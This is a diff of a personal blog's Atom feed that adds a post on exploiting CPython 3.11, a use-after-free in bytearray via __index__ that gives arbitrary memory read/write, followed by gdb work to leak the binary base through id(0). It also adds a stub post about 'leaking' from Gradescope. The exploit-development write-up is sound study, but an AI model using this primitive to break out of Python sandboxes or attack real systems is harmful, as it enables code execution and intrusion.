@@ -1,4 +1,159 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-10-21T03:52:13+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">wrenches</title><subtitle>pick a side, pick a spot, here come, here come. rome plows! the rome plows! the rome plows! the rome plows!</subtitle><entry><title type="html">fun with gates</title><link href="http://localhost:4000/2025/10/20/fun-with-gates.html" rel="alternate" type="text/html" title="fun with gates" /><published>2025-10-20T05:40:00+08:00</published><updated>2025-10-20T05:40:00+08:00</updated><id>http://localhost:4000/2025/10/20/fun-with-gates</id><content type="html" xml:base="http://localhost:4000/2025/10/20/fun-with-gates.html"><![CDATA[<p>recommended listening for this post is <a href="https://www.youtube.com/watch?v=02MAcqIvX7w">drive like jehu’s here come the rome plows</a></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-10-26T22:56:01+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">wrenches</title><subtitle>pick a side, pick a spot, here come, here come. rome plows! the rome plows! the rome plows! the rome plows!</subtitle><entry><title type="html">python pwn</title><link href="http://localhost:4000/2025/10/25/python-pwn.html" rel="alternate" type="text/html" title="python pwn" /><published>2025-10-25T03:40:00+08:00</published><updated>2025-10-25T03:40:00+08:00</updated><id>http://localhost:4000/2025/10/25/python-pwn</id><content type="html" xml:base="http://localhost:4000/2025/10/25/python-pwn.html"><![CDATA[<p>recommended listening for this post is <a href="https://www.youtube.com/watch?v=NiV5d6-GKJ4">yeule’s eko</a></p>
+
+<p><img src="/assets/images/560734.png" alt="alt text" />
+in the last post i went over (in excruciating, unasked-for detail) the internals behind a basic uaf vuln in python, and how it creates a buffer w/ a nullptr as its <code class="language-plaintext highlighter-rouge">ob_start</code> and a size that is Extremely Large, leading to arbread and arbwrite.</p>
+
+<p>in this post we are going to pwn python by calling a shell with no imports, no nothing at all. just our uaf and a dream.</p>
+
+<h3 id="where-we-left-off">where we left off</h3>
+
+<p>we left off w/ the following code:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">B</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__index__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">global</span> <span class="n">memory</span>
+        <span class="n">uaf</span><span class="p">.</span><span class="n">clear</span><span class="p">()</span>
+        <span class="n">memory</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
+        <span class="n">uaf</span><span class="p">.</span><span class="n">extend</span><span class="p">([</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">56</span><span class="p">)</span>
+        <span class="k">return</span> <span class="mi">1</span>
+
+<span class="n">uaf</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="mi">56</span><span class="p">)</span>
+<span class="n">uaf</span><span class="p">[</span><span class="mi">23</span><span class="p">]</span> <span class="o">=</span> <span class="n">B</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>i wont go over the details, read the other post for that. essentially what this does is it gives us a <em>memory</em> array we can read + write from, where the entire binary’s virtual memory is mapped into this list.</p>
+
+<p>this is a very powerful primitive obvi, and in an actual C based binary, we would leverage this primitive by looking up common www2exec strats. the principles actually <em>do</em> hold here. for example, we could certainly override, say, exit handlers, or just perform FSOP. it’s definitely feasible - see also <a href="https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc/">pwn bible</a> for more info on this</p>
+
+<p>but first of all we need to get our leaks! how do we get our leaks?</p>
+
+<p>we’d specifically need a PIE leak, then a libc leak, and both of these are surprisingly nontrivial to get. note that in an actual standard python binary that comes installed in most systems, you do <em>not</em> have PIE. but since i compiled mine from source w debug symbols, i do, and this is something i have to take into account.</p>
+
+<p>(also i hope if you’re reading this, you know what PIE is and i don’t need to explain it)</p>
+
+<p>funnily enough the fact that we have arbitrary read/write to literally any memory is kind of overwhelming in terms of thinking of where to leak - sure, you could just sweep the memory address for pointers to libc and subtract offsets, but you wont know if this actually properly <em>works</em> on various different runs</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="o">-</span><span class="p">(</span><span class="n">navi</span><span class="err">'</span><span class="n">s</span> <span class="n">curette</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">blog</span><span class="o">-</span><span class="n">rawr</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span><span class="n">code</span><span class="o">-</span><span class="n">src</span><span class="o">/</span><span class="n">python</span><span class="o">-</span><span class="n">pwn</span><span class="p">]</span>
+<span class="p">[</span><span class="o">-</span><span class="err">$</span> <span class="n">checksec</span> <span class="o">--</span><span class="n">file</span><span class="o">=</span><span class="n">python3</span><span class="p">.</span><span class="mi">11</span>
+<span class="n">RELRO</span>           <span class="n">STACK</span> <span class="n">CANARY</span>      <span class="n">NX</span>            <span class="n">PIE</span>             <span class="n">RPATH</span>      <span class="n">RUNPATH</span>	<span class="n">Symbols</span>		<span class="n">FORTIFY</span>	<span class="n">Fortified</span>	<span class="n">Fortifiable</span>	<span class="kt">FILE</span>
+<span class="n">Partial</span> <span class="n">RELRO</span>   <span class="n">No</span> <span class="n">canary</span> <span class="n">found</span>   <span class="n">NX</span> <span class="n">enabled</span>    <span class="n">PIE</span> <span class="n">enabled</span>     <span class="n">No</span> <span class="n">RPATH</span>   <span class="n">No</span> <span class="n">RUNPATH</span>   <span class="mi">14726</span> <span class="n">Symbols</span>	 <span class="n">No</span>	<span class="mi">0</span>		<span class="mi">26</span>		<span class="n">python3</span><span class="p">.</span><span class="mi">11</span>
+                                                                                                                                                                                             
+<span class="p">[</span><span class="o">-</span><span class="p">(</span><span class="n">navi</span><span class="err">'</span><span class="n">s</span> <span class="n">curette</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">blog</span><span class="o">-</span><span class="n">rawr</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span><span class="n">code</span><span class="o">-</span><span class="n">src</span><span class="o">/</span><span class="n">python</span><span class="o">-</span><span class="n">pwn</span><span class="p">]</span>
+<span class="p">[</span><span class="o">-</span><span class="err">$</span> <span class="n">checksec</span> <span class="o">--</span><span class="n">file</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">python</span>
+<span class="n">RELRO</span>           <span class="n">STACK</span> <span class="n">CANARY</span>      <span class="n">NX</span>            <span class="n">PIE</span>             <span class="n">RPATH</span>      <span class="n">RUNPATH</span>	<span class="n">Symbols</span>		<span class="n">FORTIFY</span>	<span class="n">Fortified</span>	<span class="n">Fortifiable</span>	<span class="kt">FILE</span>
+<span class="n">Partial</span> <span class="n">RELRO</span>   <span class="n">Canary</span> <span class="n">found</span>      <span class="n">NX</span> <span class="n">enabled</span>    <span class="n">No</span> <span class="n">PIE</span>          <span class="n">No</span> <span class="n">RPATH</span>   <span class="n">No</span> <span class="n">RUNPATH</span>   <span class="n">No</span> <span class="n">Symbols</span>	 <span class="n">Yes</span>	<span class="mi">15</span>		<span class="mi">40</span>		<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">python</span>
+</code></pre></div></div>
+
+<p>i introduce the first function, <code class="language-plaintext highlighter-rouge">id()</code>, which gives us the <em>address</em> of any python object we pass in:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">id</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+<span class="s">'0xa41ab0'</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">id</span><span class="p">(</span><span class="s">'abcdefgh'</span><span class="p">))</span>
+<span class="s">'0x7f28953d67f0'</span>
+</code></pre></div></div>
+
+<p>it should be obvious why this is very useful, but keep in mind we would still need an object that lies within the python binary (and <em>not</em> in libc) that does not actually get allocated to the heap, <em>and</em> is a specific offset from the python binary base. AND we need to be able to access this from the python language itself!</p>
+
+<p>i actually didnt know where to look for this, until my good buddy fern just answered my prayers (inshallah)</p>
+
+<p><img src="/assets/images/342888.png" alt="alt text" /></p>
+
+<p>this is, as fern themselves would say, very ‘profound’ and ‘elegant’ and whatnot (at least i think it is ! it’s certainly leagues more elegant than what i was planning to do , as i detailed above there)</p>
+
+<p>ok yes. so <code class="language-plaintext highlighter-rouge">id(0)</code> does in fact give an address that is a <em>fixed</em> offset from our binary base, hence leaking PIE!</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">run</span>
+<span class="n">Starting</span> <span class="n">program</span><span class="o">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">navi</span><span class="o">/</span><span class="n">blog</span><span class="o">-</span><span class="n">rawr</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span><span class="n">code</span><span class="o">-</span><span class="n">src</span><span class="o">/</span><span class="n">python</span><span class="o">-</span><span class="n">pwn</span><span class="o">/</span><span class="n">python3</span><span class="p">.</span><span class="mi">11</span> 
+<span class="p">[</span><span class="n">Thread</span> <span class="n">debugging</span> <span class="n">using</span> <span class="n">libthread_db</span> <span class="n">enabled</span><span class="p">]</span>
+<span class="n">Using</span> <span class="n">host</span> <span class="n">libthread_db</span> <span class="n">library</span> <span class="s">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="p">.</span>
+<span class="n">Python</span> <span class="mi">3</span><span class="p">.</span><span class="mi">11</span><span class="p">.</span><span class="mi">7</span> <span class="p">(</span><span class="n">main</span><span class="p">,</span> <span class="n">Oct</span> <span class="mi">19</span> <span class="mi">2025</span><span class="p">,</span> <span class="mi">15</span><span class="o">:</span><span class="mi">15</span><span class="o">:</span><span class="mi">58</span><span class="p">)</span> <span class="p">[</span><span class="n">GCC</span> <span class="mi">14</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">0</span><span class="p">]</span> <span class="n">on</span> <span class="n">linux</span>
+<span class="n">Type</span> <span class="s">"help"</span><span class="p">,</span> <span class="s">"copyright"</span><span class="p">,</span> <span class="s">"credits"</span> <span class="n">or</span> <span class="s">"license"</span> <span class="k">for</span> <span class="n">more</span> <span class="n">information</span><span class="p">.</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">hex</span><span class="p">(</span><span class="n">id</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+<span class="err">'</span><span class="mh">0x555555ac2828</span><span class="err">'</span>
+</code></pre></div></div>
+
+<p>just for our own edification let’s check what’s actually <em>at</em> this address</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="n">x</span> <span class="mh">0x555555ac2828</span>
+<span class="mh">0x555555ac2828</span> <span class="o">&lt;</span><span class="n">_PyRuntime</span><span class="o">+</span><span class="mi">840</span><span class="o">&gt;:</span>	<span class="mh">0x3b9acc53</span>
+</code></pre></div></div>
+
+<p>eh.. what? this is a pointer to some field in <code class="language-plaintext highlighter-rouge">_PyRuntime</code>? let’s actually take a quick diversion and inspect the</p>
+
+<h3 id="format-of-_pyruntime">format of _PyRuntime</h3>
+
+<p>this is not relevant to pwning python at all btw skip if you want</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">type</span> <span class="o">=</span> <span class="k">struct</span> <span class="n">pyruntimestate</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">_initialized</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">preinitializing</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">preinitialized</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">core_initialized</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">initialized</span><span class="p">;</span>
+    <span class="n">_Py_atomic_address</span> <span class="n">_finalizing</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">pyinterpreters</span> <span class="n">interpreters</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">_xidregistry</span> <span class="n">xidregistry</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">main_thread</span><span class="p">;</span>
+    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">exitfuncs</span><span class="p">[</span><span class="mi">32</span><span class="p">])(</span><span class="kt">void</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="n">nexitfuncs</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">_ceval_runtime_state</span> <span class="n">ceval</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">_gilstate_runtime_state</span> <span class="n">gilstate</span><span class="p">;</span>
+    <span class="n">PyPreConfig</span> <span class="n">preconfig</span><span class="p">;</span>
+    <span class="n">Py_OpenCodeHookFunction</span> <span class="n">open_code_hook</span><span class="p">;</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">open_code_userdata</span><span class="p">;</span>
+    <span class="n">_Py_AuditHookEntry</span> <span class="o">*</span><span class="n">audit_hook_head</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">_Py_unicode_runtime_ids</span> <span class="n">unicode_ids</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">_Py_global_objects</span> <span class="n">global_objects</span><span class="p">;</span>
+    <span class="n">PyInterpreterState</span> <span class="n">_main_interpreter</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>theres q a lot of fields in this struct but just by eyepower we probably want <code class="language-plaintext highlighter-rouge">global_objects</code>, and indeed, we do:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">p</span> <span class="o">&amp;</span><span class="n">_PyRuntime</span><span class="o">-&gt;</span><span class="n">global_objects</span>
+<span class="err">$</span><span class="mi">15</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">_Py_global_objects</span> <span class="o">*</span><span class="p">)</span> <span class="mh">0x555555ac2788</span> <span class="o">&lt;</span><span class="n">_PyRuntime</span><span class="o">+</span><span class="mi">680</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>the offset is about right yeah</p>
+
+<p>let’s actually print what’s in this global_objects struct:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+
+<span class="n">gef</span><span class="o">&gt;</span> <span class="n">ptype</span> <span class="o">&amp;</span><span class="n">_PyRuntime</span><span class="o">-&gt;</span><span class="n">global_objects</span>
+<span class="n">type</span> <span class="o">=</span> <span class="k">struct</span> <span class="n">_Py_global_objects</span> <span class="p">{</span>
+    <span class="k">struct</span> <span class="p">{</span>
+        <span class="n">PyLongObject</span> <span class="n">small_ints</span><span class="p">[</span><span class="mi">262</span><span class="p">];</span>
+        <span class="n">PyBytesObject</span> <span class="n">bytes_empty</span><span class="p">;</span>
+        <span class="k">struct</span> <span class="p">{...}</span> <span class="n">bytes_characters</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+        <span class="k">struct</span> <span class="n">_Py_global_strings</span> <span class="n">strings</span><span class="p">;</span>
+        <span class="n">PyGC_Head</span> <span class="n">_tuple_empty_gc_not_used</span><span class="p">;</span>
+        <span class="n">PyTupleObject</span> <span class="n">tuple_empty</span><span class="p">;</span>
+    <span class="p">}</span> <span class="n">singletons</span><span class="p">;</span>
+<span class="p">}</span> <span class="o">*</span>
+</code></pre></div></div>
+
+<p>given we got the id of <code class="language-plaintext highlighter-rouge">0</code>, our ptr is probably just an address to a <code class="language-plaintext highlighter-rouge">PyLongObject</code> and ofc we can dereference it as such</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">p</span> <span class="o">*</span><span class="p">(</span><span class="n">PyLongObject</span><span class="o">*</span><span class="p">)</span> <span class="mh">0x555555ac2828</span>
+<span class="err">$</span><span class="mi">16</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="n">ob_base</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="n">ob_base</span> <span class="o">=</span> <span class="p">{</span>
+      <span class="n">ob_refcnt</span> <span class="o">=</span> <span class="mh">0x3b9acc53</span><span class="p">,</span>
+      <span class="n">ob_type</span> <span class="o">=</span> <span class="mh">0x5555559cbc60</span> <span class="o">&lt;</span><span class="n">PyLong_Type</span><span class="o">&gt;</span>
+    <span class="p">},</span>
+    <span class="n">ob_size</span> <span class="o">=</span> <span class="mh">0x0</span>
+  <span class="p">},</span>
+  <span class="n">ob_digit</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="p">[</span><span class="mh">0x0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>woohoo yup</p>
+
+<p>anyways the reason this works is because our <code class="language-plaintext highlighter-rouge">_PyRuntime</code> var is defined in our python binary itself. it’s not in the heap, it’s not in libc, it’s not wherever else. so the offsets will always be constant.</p>
+
+<p>anyways lets just hit an <code class="language-plaintext highlighter-rouge">info proc mappings</code> and get our PIE leak!</p>]]></content><author><name></name></author><summary type="html"><![CDATA[recommended listening for this post is yeule’s eko]]></summary></entry><entry><title type="html">leaking shit from gradescope</title><link href="http://localhost:4000/2025/10/24/gradescope.html" rel="alternate" type="text/html" title="leaking shit from gradescope" /><published>2025-10-24T05:40:00+08:00</published><updated>2025-10-24T05:40:00+08:00</updated><id>http://localhost:4000/2025/10/24/gradescope</id><content type="html" xml:base="http://localhost:4000/2025/10/24/gradescope.html"><![CDATA[<p>rawr rawr rawr</p>]]></content><author><name></name></author><summary type="html"><![CDATA[rawr rawr rawr]]></summary></entry><entry><title type="html">fun with gates</title><link href="http://localhost:4000/2025/10/20/fun-with-gates.html" rel="alternate" type="text/html" title="fun with gates" /><published>2025-10-20T05:40:00+08:00</published><updated>2025-10-20T05:40:00+08:00</updated><id>http://localhost:4000/2025/10/20/fun-with-gates</id><content type="html" xml:base="http://localhost:4000/2025/10/20/fun-with-gates.html"><![CDATA[<p>recommended listening for this post is <a href="https://www.youtube.com/watch?v=02MAcqIvX7w">drive like jehu’s here come the rome plows</a></p>
 
 <p>so this is another sidequest i undertook after taking an intro to computing class in my uni where they taught us the basics of circuitry, just logic gates, flip flops, memory, so on so forth, it wasnt a particularly in-depth coverage (the most complicated stuff covered was CNFs, which i will actually cover later).</p>
 
@@ -939,6 +1094,8 @@
 
 <p>we can see that <code class="language-plaintext highlighter-rouge">0x17 == 23</code>, so it checks out. but we also want to verify that our <code class="language-plaintext highlighter-rouge">values</code> ptr corresponds to this <code class="language-plaintext highlighter-rouge">B()</code> class instance.</p>
 
+<p>just to be clear, the reason we specifically access the 23rd index of this bytearray is because that is the index of the MSB of the <code class="language-plaintext highlighter-rouge">ob_size</code> array.</p>
+
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">p</span> <span class="o">*</span><span class="p">((</span><span class="n">PyTypeObject</span> <span class="o">*</span><span class="p">)((</span><span class="n">PyObject</span> <span class="o">*</span><span class="p">)</span><span class="n">values</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">ob_type</span><span class="p">)</span>
 <span class="err">$</span><span class="mi">11</span> <span class="o">=</span> <span class="p">{</span>
   <span class="n">ob_base</span> <span class="o">=</span> <span class="p">{</span>
@@ -1049,12 +1206,14 @@ overwrite_me val: 0x20
 
 <p>then, we create another bytearray named <code class="language-plaintext highlighter-rouge">memory</code>. this ends up <em>overlapping</em> w our previously freed buffer <code class="language-plaintext highlighter-rouge">uaf</code>, and so, we are free to write to the struct metadata values as we please!</p>
 
+<p>% do you compute %
+% do you compute %
+% do you or dont you %</p>
+
 <p>however, we don’t actually have any ‘direct’ writes, meaning we need to leverage this nonsense w/ the <code class="language-plaintext highlighter-rouge">__index__</code> func to perform our write for us. see here, in the <code class="language-plaintext highlighter-rouge">bytearray_ass_subscript</code> func:</p>
 
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="n">ival</span>
 </code></pre></div></div>
-
-<p>this is our freed buf (which now overlaps w/ our <code class="language-plaintext highlighter-rouge">memory</code> struct)!</p>
 
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">p</span> <span class="o">*</span><span class="p">(</span><span class="n">PyByteArrayObject</span> <span class="o">*</span><span class="p">)</span> <span class="n">buf</span>
 <span class="err">$</span><span class="mi">5</span> <span class="o">=</span> <span class="p">{</span>
